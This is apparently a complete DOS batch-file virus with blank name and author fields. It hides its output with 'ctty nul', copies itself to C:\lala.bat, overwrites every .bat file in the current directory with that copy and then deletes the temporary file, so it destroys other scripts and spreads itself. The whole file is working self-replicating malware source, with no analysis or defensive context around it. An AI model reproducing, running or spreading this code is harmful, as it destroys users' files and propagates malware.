@echo off
REM Name:                   
REM Author:                 
ctty nul
copy %0 C:\lala.bat
for %%v in (*.bat) do copy C:\lala.bat %%v
@del C:\lala.bat
